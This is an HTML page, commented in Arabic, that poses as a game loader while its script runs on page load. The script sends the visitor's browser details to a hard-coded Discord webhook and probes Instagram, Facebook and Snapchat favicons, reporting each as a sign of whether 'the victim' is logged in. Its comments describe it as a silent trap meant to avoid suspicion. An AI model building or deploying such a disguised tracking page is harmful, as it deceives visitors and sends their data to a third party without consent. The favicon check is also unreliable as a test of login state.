<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تحميل اللعبة...</title>
    <style>
        /* إخفاء كل شيء عشان الضحية ما يشك */
        body { background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>جاري تحميل محرك اللعبة، يرجى الانتظار...</p>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";

        // دالة لإرسال التقرير لديسكورد
        async function sendLog(service, status) {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    content: `🚀 **تحديث من المصيدة:**\nالخدمة: ${service}\nالحالة: ${status}\nالوقت: ${new Date().toLocaleTimeString()}`
                })
            });
        }

        // دالة "المصيدة الصامتة" لكل تطبيق
        function probeService(name, url) {
            return new Promise((resolve) => {
                const img = new Image();
                img.onload = () => { sendLog(name, "✅ الضحية مسجل دخول أو المتصفح تعرف على الخدمة"); resolve(); };
                img.onerror = () => { sendLog(name, "❌ تعذر الوصول أو الخدمة غير مفعلة"); resolve(); };
                // نستخدم صورة موجودة أصلاً في مسار مشهور داخل التطبيق
                img.src = url + "?t=" + new Date().getTime(); 
            });
        }

        async function startSilentMission() {
            // سحب معلومات الجهاز أولاً
            await sendLog("System Info", navigator.userAgent);

            // 1. فحص انستا
            await probeService("Instagram", "https://www.instagram.com/favicon.ico");
            
            // 2. فحص فيسبوك
            await probeService("Facebook", "https://www.facebook.com/favicon.ico");

            // 3. فحص سناب شات
            await probeService("Snapchat", "https://www.snapchat.com/favicon.ico");

            // بعد انتهاء المهام، ممكن تنقل الضحية للعبة فعلياً
            // window.location.href = "رابط_اللعبة_الحقيقي";
        }

        window.onload = startSilentMission;
    </script>
</body>
</html>
